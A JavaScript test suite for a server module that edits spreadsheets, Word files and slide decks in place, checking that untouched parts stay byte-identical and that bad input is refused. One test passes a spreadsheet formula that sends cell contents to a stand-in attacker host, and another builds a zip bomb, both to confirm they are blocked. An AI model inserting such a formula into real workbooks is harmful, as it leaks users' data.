/**
 * Changing a file somebody sent, where it stands (owner, 2026-11-05).
 *
 * The report: asked to fill in the ACC column of a workbook, a model made a separate
 * Word file about it. What the owner showed instead is Claude writing into the sheet's
 * XML, so comments, hidden sheets and formatting survive, and then checking that only
 * those cells differ. These are real files, written by hand so that each thing a
 * library would lose is in them, and read back by a library that had no part in it.
 *
 *   node test/edit-in-place.test.mjs
 */
import { PGlite } from '@electric-sql/pglite';
import { writeZip, openZip } from '../server/office/zip.js';

let failures = 0;
const section = (n) => console.log(`\n\x1b[1m${n}\x1b[0m`);
const check = (l, ok, d = '') => {
  console.log(`  ${ok ? '\x1b[32m✓\x1b[0m' : '\x1b[31m✗ FAIL\x1b[0m'}  ${l}${d ? ` — ${d}` : ''}`);
  if (!ok) failures += 1;
};
const refused = (fn, pattern) => {
  try {
    fn();
    return false;
  } catch (err) {
    return pattern.test(String(err.message));
  }
};

process.env.ENCRYPTION_KEY ||= 'test-encryption-key-for-the-edit-suite';
const edit = await import('../server/office/edit.js');
const { editWorkbook, editDocument, readWorkbookCells, readDocumentWords } = edit;

const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M/AAAMBAQAY3Y2wAAAAAElFTkSuQmCC', 'base64');
const MAIN = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main';
const REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';

/** A workbook with everything in it that a library that opens and saves would lose or change. */
function workbook() {
  return writeZip([
    {
      name: '[Content_Types].xml',
      data:
        '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension="png" ContentType="image/png"/>' +
        '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>' +
        '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>' +
        '<Override PartName="/xl/worksheets/sheet2.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>' +
        '<Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>' +
        '<Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>' +
        '<Override PartName="/xl/comments1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.comments+xml"/>' +
        '<Override PartName="/xl/calcChain.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.calcChain+xml"/></Types>',
    },
    {
      name: '_rels/.rels',
      data: `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="${REL}/officeDocument" Target="xl/workbook.xml"/></Relationships>`,
    },
    {
      name: 'xl/workbook.xml',
      data:
        `<?xml version="1.0"?><workbook xmlns="${MAIN}" xmlns:r="${REL}"><sheets><sheet name="DQT - T10" sheetId="1" r:id="rId1"/><sheet name="Hidden data" sheetId="2" state="hidden" r:id="rId2"/></sheets>` +
        '<definedNames><definedName name="Total">\'DQT - T10\'!$E$4</definedName></definedNames><calcPr calcId="191029"/></workbook>',
    },
    {
      name: 'xl/_rels/workbook.xml.rels',
      data:
        '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
        `<Relationship Id="rId1" Type="${REL}/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="${REL}/worksheet" Target="worksheets/sheet2.xml"/>` +
        `<Relationship Id="rId3" Type="${REL}/styles" Target="styles.xml"/><Relationship Id="rId4" Type="${REL}/sharedStrings" Target="sharedStrings.xml"/>` +
        `<Relationship Id="rId5" Type="${REL}/calcChain" Target="calcChain.xml"/></Relationships>`,
    },
    {
      name: 'xl/styles.xml',
      data:
        `<?xml version="1.0"?><styleSheet xmlns="${MAIN}"><fonts count="2"><font><sz val="11"/><name val="Calibri"/></font><font><b/><color rgb="FF0000FF"/><sz val="11"/><name val="Calibri"/></font></fonts><fills count="2"><fill><patternFill patternType="none"/></fill><fill><patternFill patternType="gray125"/></fill></fills><borders count="1"><border/></borders><cellStyleXfs count="1"><xf/></cellStyleXfs>` +
        '<cellXfs count="3"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/><xf numFmtId="0" fontId="1" fillId="0" borderId="0" applyFont="1"/><xf numFmtId="4" fontId="0" fillId="0" borderId="0" applyNumberFormat="1"><alignment horizontal="right"/></xf></cellXfs></styleSheet>',
    },
    {
      name: 'xl/sharedStrings.xml',
      data: `<?xml version="1.0"?><sst xmlns="${MAIN}" count="3" uniqueCount="3"><si><t>Tên</t></si><si><t>ACC</t></si><si><r><t>Chi phí </t></r><r><rPr><b/></rPr><t>nhiên liệu</t></r></si></sst>`,
    },
    {
      name: 'xl/worksheets/sheet1.xml',
      data:
        `<?xml version="1.0"?><worksheet xmlns="${MAIN}" xmlns:r="${REL}"><dimension ref="A1:E5"/><sheetFormatPr defaultRowHeight="15"/><cols><col min="1" max="1" width="20" customWidth="1"/><col min="11" max="11" width="30" customWidth="1"/></cols><sheetData>` +
        '<row r="1" spans="1:2"><c r="A1" s="1" t="s"><v>0</v></c><c r="B1" s="1" t="s"><v>1</v></c></row>' +
        '<row r="2"><c r="A2" t="s"><v>2</v></c><c r="B2" s="2"><v>12.5</v></c></row>' +
        '<row r="4"><c r="D4"><v>3</v></c><c r="E4" s="2"><f>D4*2</f><v>6</v></c></row>' +
        '<row r="5"><c r="A5"><f t="shared" ref="A5:A7" si="0">D4+1</f><v>4</v></c></row>' +
        '<row r="6"><c r="A6"><f t="shared" si="0"/><v>5</v></c></row>' +
        '</sheetData><mergeCells count="1"><mergeCell ref="G2:I3"/></mergeCells><legacyDrawing r:id="rId9"/></worksheet>',
    },
    {
      name: 'xl/worksheets/_rels/sheet1.xml.rels',
      data: `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId8" Type="${REL}/comments" Target="../comments1.xml"/></Relationships>`,
    },
    {
      name: 'xl/worksheets/sheet2.xml',
      data: `<?xml version="1.0"?><worksheet xmlns="${MAIN}"><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>bí mật trong sheet ẩn</t></is></c></row></sheetData></worksheet>`,
    },
    {
      name: 'xl/comments1.xml',
      data: `<?xml version="1.0"?><comments xmlns="${MAIN}"><authors><author>Trưởng phòng</author></authors><commentList><comment ref="B2" authorId="0"><text><r><t>Kiểm tra lại con số này</t></r></text></comment></commentList></comments>`,
    },
    { name: 'xl/calcChain.xml', data: `<?xml version="1.0"?><calcChain xmlns="${MAIN}"><c r="E4" i="1"/><c r="A5"/></calcChain>` },
    { name: 'xl/media/image1.png', data: PNG },
  ]);
}

const partsOf = (buffer) => {
  const zip = openZip(buffer);
  return new Map(zip.names.map((name) => [name, zip.read(name)]));
};

section('a workbook: only the cells named change');
{
  const original = workbook();
  const done = editWorkbook(original, [
    { sheet: 'DQT - T10', cell: 'K2', value: 'Đã đối chiếu' },
    { sheet: 'DQT - T10', cell: 'B2', value: 99.5 },
    { sheet: 1, cell: 'C3', value: 'hàng mới' },
    { sheet: 'dqt - t10', cell: 'C1', value: true },
  ]);
  const before = partsOf(original);
  const after = partsOf(done.buffer);
  const sheet = after.get('xl/worksheets/sheet1.xml').toString();
  check('the file still opens, with every part it had', [...before.keys()].every((name) => after.has(name)) && after.size === before.size, [...after.keys()].join(' '));
  const same = ['xl/worksheets/sheet2.xml', 'xl/comments1.xml', 'xl/sharedStrings.xml', 'xl/media/image1.png', 'xl/calcChain.xml', '_rels/.rels', '[Content_Types].xml'];
  check('every part it had no reason to touch is the same bytes', same.every((name) => before.get(name).equals(after.get(name))), same.filter((name) => !before.get(name).equals(after.get(name))).join());
  check('the hidden sheet is there, and still hidden', /state="hidden"/.test(after.get('xl/workbook.xml').toString()));
  check('the comment is there', /Kiểm tra lại con số này/.test(after.get('xl/comments1.xml').toString()));
  check('a named range is there', /definedName name="Total"/.test(after.get('xl/workbook.xml').toString()));
  check('untouched rows are exactly as written', sheet.includes('<row r="4"><c r="D4"><v>3</v></c><c r="E4" s="2"><f>D4*2</f><v>6</v></c></row>'));
  check('words go in as words, with their accents', sheet.includes('<c r="K2" t="inlineStr"><is><t xml:space="preserve">Đã đối chiếu</t></is></c>'), sheet.slice(300, 800));
  check('a number keeps the cell\'s look', sheet.includes('<c r="B2" s="2"><v>99.5</v></c>'));
  check('a cell lands in its column\'s order', sheet.indexOf('r="B2"') < sheet.indexOf('r="K2"') && sheet.indexOf('r="A2"') < sheet.indexOf('r="B2"'));
  check('a new row lands in order', sheet.indexOf('<row r="2"') < sheet.indexOf('<row r="3"') && sheet.indexOf('<row r="3"') < sheet.indexOf('<row r="4"'));
  check('true and false are what they are', sheet.includes('<c r="C1" t="b"><v>1</v></c>'));
  check('the used range grows to hold them', /<dimension ref="A1:K5"\/>/.test(sheet), sheet.slice(0, 200));
  check('a row\'s declared span grows too, or Excel complains', /<row r="1" spans="1:3">/.test(sheet), sheet.slice(sheet.indexOf('<row r="1"'), sheet.indexOf('<row r="1"') + 40));
  check('it says what changed', done.changed[0].sheet === 'DQT - T10' && done.changed[0].cells.length === 4, JSON.stringify(done.changed));
  check('and which sheet to look at afterwards', done.sheetNumbers.join() === '1');

  const XLSX = await import('xlsx');
  const read = XLSX.read(done.buffer, { type: 'buffer', bookSheets: false });
  const ws = read.Sheets['DQT - T10'];
  check('a library that had no part in it reads the new cells', ws.K2?.v === 'Đã đối chiếu' && ws.B2?.v === 99.5 && ws.C1?.v === true && ws.C3?.v === 'hàng mới', JSON.stringify({ K2: ws.K2?.v, B2: ws.B2?.v }));
  check('  and the ones that were there', ws.A1?.v === 'Tên' && ws.D4?.v === 3 && ws.E4?.f === 'D4*2');
  check('  and sees the hidden sheet', read.SheetNames.join() === 'DQT - T10,Hidden data');

  const { lookAtFile } = await import('../server/office/look.js');
  const drawn = await lookAtFile(done.buffer, { name: 'x.xlsx', timeoutMs: 30000 });
  check('and it can be drawn', drawn?.sheets?.length >= 1, String(drawn?.sheets?.length));
}

section('words longer than the cell');
{
  const long = 'Doanh thu giảm so với kế hoạch do sản lượng thấp hơn dự kiến, cần rà soát lại định mức nhiên liệu và chi phí ngoài nhiên liệu theo từng cung đường trong tháng này.';
  const done = editWorkbook(workbook(), [{ sheet: 1, cell: 'K2', value: long }]);
  const after = partsOf(done.buffer);
  const sheet = after.get('xl/worksheets/sheet1.xml').toString();
  const styles = after.get('xl/styles.xml').toString();
  check('a style like its own that wraps is added', /<cellXfs count="4">/.test(styles) && /wrapText="1"/.test(styles), styles.slice(styles.indexOf('<cellXfs'), styles.indexOf('<cellXfs') + 400));
  check('  every style already in use keeps its number', styles.indexOf('applyFont="1"') < styles.indexOf('wrapText="1"'));
  check('  and the cell uses it', /<c r="K2" s="3" t="inlineStr">/.test(sheet), sheet.slice(sheet.indexOf('r="K2"') - 5, sheet.indexOf('r="K2"') + 40));
  const row = /<row r="2"([^>]*)>/.exec(sheet)?.[1] || '';
  const height = Number(/ht="([\d.]+)"/.exec(row)?.[1]);
  check('the row grows to show it', height >= 75 && /customHeight="1"/.test(row), row);
  const reused = editWorkbook(workbook(), [{ sheet: 1, cell: 'K2', value: long }, { sheet: 1, cell: 'K4', value: long }]);
  check('one copy of the style, however many cells use it', /<cellXfs count="4">/.test(partsOf(reused.buffer).get('xl/styles.xml').toString()));
  const short = editWorkbook(workbook(), [{ sheet: 1, cell: 'K2', value: 'ngắn' }]);
  check('words that fit change nothing about the row or the styles', !/ht=/.test(/<row r="2"([^>]*)>/.exec(partsOf(short.buffer).get('xl/worksheets/sheet1.xml').toString())?.[1] || '') && partsOf(short.buffer).get('xl/styles.xml').equals(partsOf(workbook()).get('xl/styles.xml')));
  const asked = editWorkbook(workbook(), [{ sheet: 1, cell: 'A1', value: 'x', row_height: 40 }]);
  check('a height can be asked for', /<row r="1"[^>]*ht="40"[^>]*customHeight="1"/.test(partsOf(asked.buffer).get('xl/worksheets/sheet1.xml').toString()));
  const look = editWorkbook(workbook(), [{ sheet: 1, cell: 'K2', value: 'x', style_from: 'A1' }]);
  check('and a look taken from another cell', /<c r="K2" s="1" t="inlineStr">/.test(partsOf(look.buffer).get('xl/worksheets/sheet1.xml').toString()));
}

section('formulas');
{
  const done = editWorkbook(workbook(), [{ sheet: 1, cell: 'D4', value: 7 }]);
  const after = partsOf(done.buffer);
  check('Excel is told to work them out again', /<calcPr calcId="191029" fullCalcOnLoad="1"\/>/.test(after.get('xl/workbook.xml').toString()), after.get('xl/workbook.xml').toString().slice(-100));
  check('  and the model is told their saved results are stale until then', done.notes.some((n) => /last saved results/.test(n)));
  check('a number going in does not touch the list of formulas', after.has('xl/calcChain.xml'));

  const replaced = editWorkbook(workbook(), [{ sheet: 1, cell: 'E4', value: 'không còn công thức' }]);
  const gone = partsOf(replaced.buffer);
  check('a formula replaced takes the list of formulas with it, or Excel calls the file damaged', !gone.has('xl/calcChain.xml'));
  check('  from the content types', !/calcChain/.test(gone.get('[Content_Types].xml').toString()));
  check('  and the relationships', !/calcChain/.test(gone.get('xl/_rels/workbook.xml.rels').toString()));

  const added = editWorkbook(workbook(), [{ sheet: 1, cell: 'F4', formula: '=SUM(D4:E4)' }]);
  check('a formula goes in without its equals sign', /<c r="F4"><f>SUM\(D4:E4\)<\/f><\/c>/.test(partsOf(added.buffer).get('xl/worksheets/sheet1.xml').toString()));
  check('a formula other cells share cannot be changed alone', refused(() => editWorkbook(workbook(), [{ sheet: 1, cell: 'A5', value: 1 }]), /share/));
  check('  though one of those that share it can', !!editWorkbook(workbook(), [{ sheet: 1, cell: 'A6', value: 1 }]).buffer);
}

section('what the review found');
{
  const after = editWorkbook(workbook(), [
    { sheet: 1, cell: 'A1', value: 'changed' },
    { sheet: 1, cell: 'K3', value: 'copied', style_from: 'A1' },
  ]);
  const xml = partsOf(after.buffer).get('xl/worksheets/sheet1.xml');
  const styleOf = (ref) => new RegExp(`<c r="${ref}"[^>]*\\bs="(\\d+)"`).exec(xml)?.[1];
  check('a cell changed earlier in the call can still lend its look', styleOf('A1') != null && styleOf('K3') === styleOf('A1'), `${styleOf('A1')} ${styleOf('K3')}`);
  let refused = '';
  try {
    editWorkbook(workbook(), [{ sheet: 1, cell: 'K4', formula: '=WEBSERVICE("https://evil.example/?d="&A1)' }]);
  } catch (err) {
    refused = err.message;
  }
  check('a formula that reaches out is not added', /reaches out/.test(refused), refused);

  const bomb = writeZip([
    ...[...partsOf(workbook())].map(([name, data]) => ({ name, data })),
    ...Array.from({ length: 6 }, (_, i) => ({ name: `xl/media/huge${i}.bin`, data: Buffer.alloc(60 * 1024 * 1024) })),
  ]);
  let tooBig = '';
  try {
    editWorkbook(bomb, [{ sheet: 1, cell: 'K5', value: 'x' }]);
  } catch (err) {
    tooBig = err.message;
  }
  check('a small file that unpacks to a great deal is refused, not held in memory', /unpacks to more/.test(tooBig), tooBig);
}

section('what is refused, and how');
{
  check('a sheet that is not there, naming the ones that are', refused(() => editWorkbook(workbook(), [{ sheet: 'Nope', cell: 'A1', value: 1 }]), /no sheet called "Nope".*"DQT - T10", "Hidden data"/));
  check('several sheets and none named', refused(() => editWorkbook(workbook(), [{ cell: 'A1', value: 1 }]), /does not say which sheet/));
  check('an address that is not one', refused(() => editWorkbook(workbook(), [{ sheet: 1, cell: 'K', value: 1 }]), /not a cell address/));
  check('inside a merge, naming the cell that shows', refused(() => editWorkbook(workbook(), [{ sheet: 1, cell: 'H3', value: 1 }]), /inside the merged cells G2:I3; only G2/));
  check('  while that cell is fine', !!editWorkbook(workbook(), [{ sheet: 1, cell: 'G2', value: 'x' }]).buffer);
  check('nothing to do', refused(() => editWorkbook(workbook(), []), /Say which cells/));
  check('not a workbook at all', refused(() => editWorkbook(Buffer.from('nope'), [{ cell: 'A1', value: 1 }]), /./));
  const nasty = editWorkbook(workbook(), [{ sheet: 1, cell: 'K2', value: 'a<b>&"c\u0001d' }]);
  const xml = partsOf(nasty.buffer).get('xl/worksheets/sheet1.xml').toString();
  check('what cannot be in XML cannot break it', xml.includes('a&lt;b&gt;&amp;"cd'), xml.slice(xml.indexOf('r="K2"'), xml.indexOf('r="K2"') + 80));
}

section('reading a workbook by address');
{
  const file = workbook();
  const list = readWorkbookCells(file);
  check('every sheet is listed, the hidden one said to be', /"DQT - T10"/.test(list) && /"Hidden data" \(hidden\)/.test(list), list);
  check('  with its comments counted', /1 comment/.test(list));
  const cells = readWorkbookCells(file, { sheet: 'DQT - T10' });
  check('a cell by its address', /A1: Tên/.test(cells) && /B1: ACC/.test(cells), cells);
  check('words cut into runs read whole', /A2: Chi phí nhiên liệu/.test(cells));
  check('a formula beside its result', /E4: 6 {2}\(=D4\*2\)/.test(cells));
  check('a comment beside its cell', /B2: 12\.5 {2}\[comment: Kiểm tra lại con số này\]/.test(cells));
  check('what is merged', /Merged: G2:I3/.test(cells));
  const part = readWorkbookCells(file, { sheet: 1, range: 'A1:A1' });
  check('a range is only that', /A1: Tên/.test(part) && !/B1/.test(part), part);
  check('the hidden sheet can be read', /bí mật trong sheet ẩn/.test(readWorkbookCells(file, { sheet: 'Hidden data' })));
  const found = readWorkbookCells(file, { find: 'acc' });
  check('finding a column by its heading gives its address', /"DQT - T10"!B1: ACC/.test(found), found);
  check('finding reaches comments', /B2.*Kiểm tra lại/.test(readWorkbookCells(file, { find: 'kiểm tra' })));
  check('and hidden sheets', /"Hidden data"!A1/.test(readWorkbookCells(file, { find: 'bí mật' })));
  check('and says so when nothing does', /Nothing in any sheet/.test(readWorkbookCells(file, { find: 'không có' })));
  const edited = editWorkbook(file, [{ sheet: 1, cell: 'K2', value: 'đã sửa' }]);
  check('what was just written reads back', /K2: đã sửa/.test(readWorkbookCells(edited.buffer, { sheet: 1 })));
  check('long sheets say where they stop', /goes on from/.test(readWorkbookCells(file, { sheet: 1, maxChars: 20 })));
}

const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
const docx = (body, extra = []) =>
  writeZip([
    { name: '[Content_Types].xml', data: '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>' },
    { name: '_rels/.rels', data: `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="${REL}/officeDocument" Target="word/document.xml"/></Relationships>` },
    { name: 'word/document.xml', data: `<w:document ${W}><w:body>${body}</w:body></w:document>` },
    { name: 'word/media/image1.png', data: PNG },
    ...extra,
  ]);
const run = (text, look = '') => `<w:r>${look ? `<w:rPr>${look}</w:rPr>` : ''}<w:t xml:space="preserve">${text}</w:t></w:r>`;

section('a Word file: the words named, keeping their look');
{
  const body =
    `<w:p><w:pPr><w:pStyle w:val="Heading1"/></w:pPr>${run('Báo cáo ', '<w:b/>')}${run('tháng ', '<w:i/>')}${run('9')}</w:p>` +
    `<w:p>${run('Doanh thu tăng 12%')}</w:p><w:tbl><w:tr><w:tc><w:p>${run('trong bảng')}</w:p></w:tc></w:tr></w:tbl><w:p>${run('lặp')}</w:p><w:p>${run('lặp')}</w:p>`;
  const file = docx(body, [{ name: 'word/header1.xml', data: `<w:hdr ${W}><w:p>${run('Công ty ABC')}</w:p></w:hdr>` }]);
  const across = editDocument(file, 'docx', [{ find: 'tháng 9', replace: 'tháng 10' }]);
  const xml = partsOf(across.buffer).get('word/document.xml').toString();
  check('words cut across runs are found', /Báo cáo /.test(xml) && /tháng 10/.test(xml) && !/tháng 9/.test(xml.replace(/<[^>]+>/g, '')), xml.slice(0, 400));
  check('  and the new words keep the look of where they start', /<w:rPr><w:i\/><\/w:rPr><w:t xml:space="preserve">tháng 10<\/w:t>/.test(xml));
  check('  the words before them keep theirs', /<w:rPr><w:b\/><\/w:rPr><w:t xml:space="preserve">Báo cáo <\/w:t>/.test(xml));
  check('  and the paragraph its style', /<w:pStyle w:val="Heading1"\/>/.test(xml));
  check('a picture in the file is the same bytes', partsOf(across.buffer).get('word/media/image1.png').equals(PNG));
  check('in a table too', /trong BẢNG/.test(partsOf(editDocument(file, 'docx', [{ find: 'trong bảng', replace: 'trong BẢNG' }]).buffer).get('word/document.xml').toString()));
  check('in a header too', /Công ty XYZ/.test(partsOf(editDocument(file, 'docx', [{ find: 'Công ty ABC', replace: 'Công ty XYZ' }]).buffer).get('word/header1.xml').toString()));
  check('in two places it needs saying which', refused(() => editDocument(file, 'docx', [{ find: 'lặp', replace: 'x' }]), /matches 2 places/));
  const all = editDocument(file, 'docx', [{ find: 'lặp', replace: 'một', all: true }]);
  check('  or `all`', (partsOf(all.buffer).get('word/document.xml').toString().match(/một/g) || []).length === 2 && all.changed === 2, String(all.changed));
  const swap = editDocument(file, 'docx', [{ find: 'lặp', replace: 'lặp lại', all: true }]);
  check('  a replacement holding what it replaces does not go round for ever', (partsOf(swap.buffer).get('word/document.xml').toString().match(/lặp lại/g) || []).length === 2);
  check('words that are not there are refused, all or nothing', refused(() => editDocument(file, 'docx', [{ find: 'tháng 9', replace: 'x' }, { find: 'không có', replace: 'y' }]), /Change 2 did not match/));
  const added = editDocument(file, 'docx', [{ find: 'Doanh thu', add_after: 'Một đoạn mới' }]);
  const addedXml = partsOf(added.buffer).get('word/document.xml').toString();
  check('a new paragraph goes after the one named', addedXml.indexOf('Doanh thu') < addedXml.indexOf('Một đoạn mới') && addedXml.indexOf('Một đoạn mới') < addedXml.indexOf('trong bảng'));
  const words = readDocumentWords(file, 'docx');
  check('its words read as they are, ready to be matched', /Báo cáo tháng 9/.test(words) && /Doanh thu tăng 12%/.test(words), words);
  check('nothing it could not be rebuilt from is lost', [...partsOf(file).keys()].every((name) => partsOf(across.buffer).has(name)));
}

section('"all" with a replacement that holds what it replaces');
{
  const file = docx(`<w:p>${run('Báo cáo tháng 9 và tháng 9')}</w:p>`);
  const all = editDocument(file, 'docx', [{ find: 'tháng 9', replace: 'tháng 9 năm 2026', all: true }]);
  const text = String(partsOf(all.buffer).get('word/document.xml'));
  check('changes every one, and leaves no mark behind', (text.match(/tháng 9 năm 2026/g) || []).length === 2 && !text.includes('\uE000'), text.slice(-200));
}

section('a deck');
{
  const A = 'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"';
  const slide = (text) => `<p:sld ${A}><p:cSld><p:spTree><p:sp><p:txBody><a:p><a:r><a:rPr sz="2400"/><a:t>${text}</a:t></a:r></a:p></p:txBody></p:sp></p:spTree></p:cSld></p:sld>`;
  const file = writeZip([
    { name: '[Content_Types].xml', data: '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>' },
    { name: 'ppt/slides/slide1.xml', data: slide('Tiêu đề A') },
    { name: 'ppt/slides/slide2.xml', data: slide('Tiêu đề A') },
    { name: 'ppt/media/image1.png', data: PNG },
  ]);
  const one = editDocument(file, 'pptx', [{ find: 'Tiêu đề A', replace: 'Tiêu đề B', slide: 2 }]);
  const parts = partsOf(one.buffer);
  check('on the slide named, and only there', /Tiêu đề A/.test(parts.get('ppt/slides/slide1.xml').toString()) && /Tiêu đề B/.test(parts.get('ppt/slides/slide2.xml').toString()));
  check('with its look', /<a:rPr sz="2400"\/><a:t xml:space="preserve">Tiêu đề B/.test(parts.get('ppt/slides/slide2.xml').toString()));
  check('and the slide it was not on is the same bytes', parts.get('ppt/slides/slide1.xml').equals(partsOf(file).get('ppt/slides/slide1.xml')));
  check('a slide that is not there is refused', refused(() => editDocument(file, 'pptx', [{ find: 'x', slide: 9 }]), /no slide 9/));
  check('its words, by slide', /--- slide 2 ---\nTiêu đề A/.test(readDocumentWords(file, 'pptx')) && !/slide 1/.test(readDocumentWords(file, 'pptx', { slide: 2 })));
}

section('update_file on a file somebody sent');
{
  const { initStore } = await import('../server/store/index.js');
  const memory = await PGlite.create();
  const store = await initStore({ driver: { query: async (text, params = []) => (await memory.query(text, params)).rows } });
  await store.createUser({ id: 'u-edit', email: 'edit@example.com', passwordHash: 'x', name: 'E', role: 'user' });
  await store.createUser({ id: 'u-other', email: 'other@example.com', passwordHash: 'x', name: 'O', role: 'user' });
  const user = await store.getUserById('u-edit');
  const other = await store.getUserById('u-other');
  await store.createChat('u-edit', { id: 'c-edit', title: 'edit' });
  const { saveUpload } = await import('../server/attachments.js');
  const { executeTool } = await import('../server/tools/execute.js');
  const run2 = (name, input, who = user) => executeTool({ user: who, name, input, chatId: 'c-edit' });
  const original = workbook();
  const upload = await saveUpload('u-edit', { name: 'Báo cáo.xlsx', mime: '', data: original.toString('base64') });
  await memory.query('UPDATE attachments SET chat_id = $1 WHERE id = $2', ['c-edit', upload.id]);

  const listed = await run2('read_generated_file', { file_id: upload.id });
  check('its sheets can be listed', /"Hidden data" \(hidden\)/.test(listed.content), listed.content.slice(0, 200));
  check('  and what is in it is marked as somebody\'s content, not as instructions', /<untrusted/.test(listed.content));

  const first = await run2('update_file', { file_id: upload.id, cells: [{ sheet: 'DQT - T10', cell: 'K2', value: 'nhận xét một' }] });
  check('the change is made', !first.isError && /Changed 1 cell/.test(first.content), first.content);
  check('  it says the rest was checked', /no other cell, and nothing else in the file, is any different/.test(first.content));
  check('  same name, a file card, and which sheet to draw', first.file?.name === 'Báo cáo.xlsx' && first.file?.lookAt?.join() === '1', JSON.stringify(first.file));
  const kept = await store.getAttachment('u-edit', upload.id);
  check('what they sent is untouched', Buffer.from(kept.data, 'base64').equals(original));
  const versions = await store.listAttachmentVersions('u-edit', first.file.id);
  check('  and is the first version of the changed one', versions.length === 1 && versions[0].revision === 1, JSON.stringify(versions.map((v) => v.revision)));

  const second = await run2('update_file', { file_id: upload.id, cells: [{ sheet: 'DQT - T10', cell: 'K4', value: 'nhận xét hai' }] });
  check('named by the original again, it goes on the same copy', second.file?.id === first.file.id, `${second.file?.id} ${first.file.id}`);
  const both = await run2('read_generated_file', { file_id: upload.id, sheet: 'DQT - T10' });
  check('  and both changes are there', /K2: nhận xét một/.test(both.content) && /K4: nhận xét hai/.test(both.content), both.content.slice(0, 300));
  const third = await run2('update_file', { file_id: first.file.id, cells: [{ sheet: 'DQT - T10', cell: 'K5', value: 'ba' }] });
  check('named by the copy, the same', third.file?.id === first.file.id && !third.isError);
  check('versions pile up, nothing lost', (await store.listAttachmentVersions('u-edit', first.file.id)).length === 3);

  const whole = await run2('update_file', { file_id: upload.id, content: '# viết lại' });
  check('rewriting all of it from Markdown is not allowed on their file', whole.isError && /rewritten whole/.test(whole.content), whole.content);
  const stranger = await run2('update_file', { file_id: upload.id, cells: [{ sheet: 1, cell: 'A1', value: 'x' }] }, other);
  check('another account cannot reach it', stranger.isError && /no file with the id/.test(stranger.content));

  const wordFile = await saveUpload('u-edit', { name: 'Thư.docx', mime: '', data: docx(`<w:p>${run('Kính gửi ')}${run('ông A')}</w:p>`).toString('base64') });
  const wordDone = await run2('update_file', { file_id: wordFile.id, edits: [{ find: 'ông A', replace: 'bà B' }] });
  check('a Word file by its words', !wordDone.isError && /Made 1 change/.test(wordDone.content), wordDone.content);
  const wordRead = await run2('read_generated_file', { file_id: wordFile.id });
  check('  reading it says what it now says', /bà B/.test(wordRead.content), wordRead.content);

  const textFile = await saveUpload('u-edit', { name: 'a.csv', mime: 'text/csv', data: Buffer.from('a,b\n1,2\n').toString('base64') });
  const textDone = await run2('update_file', { file_id: textFile.id, edits: [{ find: '1,2', replace: '3,4' }] });
  const textRow = await store.getAttachment('u-edit', textDone.file.id);
  check('a text file the same', Buffer.from(textRow.data, 'base64').toString() === 'a,b\n3,4\n', textDone.content);

  const png = await saveUpload('u-edit', { name: 'a.png', mime: 'image/png', data: PNG.toString('base64') });
  const noWay = await run2('update_file', { file_id: png.id, edits: [{ find: 'x', replace: 'y' }] });
  check('what has no words says how else it can be done', noWay.isError && /sandbox_run with bring/.test(noWay.content), noWay.content);

  const made = await run2('create_file', { name: 'Nhận xét', format: 'docx', content: '# Nhận xét\n\nabc' });
  check('a new file while theirs sits unchanged says so', /attached Báo cáo\.xlsx/.test(made.content) && /not what they asked for/.test(made.content), made.content.slice(-260));
  const madeSource = await run2('update_file', { file_id: made.file.id, edits: [{ find: 'abc', replace: 'xyz' }] });
  check('one you made still goes by its source', !madeSource.isError && /Made 1 change to/.test(madeSource.content), madeSource.content);
}

section('the guard knows a change landed on a copy');
{
  const { createStepGuard } = await import('../server/stepOrder.js');
  const guard = createStepGuard();
  const read = { id: 'r', name: 'read_generated_file', input: { file_id: 'up', sheet: '1' } };
  guard.note(read, { content: 'before' });
  check('reading the same again is pointless', /has not changed/.test(guard.check(read)?.content || '') || guard.check(read) === null);
  guard.note({ id: 'w', name: 'update_file', input: { file_id: 'up', cells: [{ cell: 'A1', value: 1 }] } }, { content: 'ok', file: { id: 'copy', name: 'x.xlsx', format: 'xlsx' } });
  check('after a change, it reads again', guard.check(read) === null, JSON.stringify(guard.check(read)));
}

console.log(failures ? `\n\x1b[31m${failures} check(s) failed.\x1b[0m\n` : '\n\x1b[32mAll edit-in-place checks passed.\x1b[0m\n');
process.exit(failures ? 1 : 0);
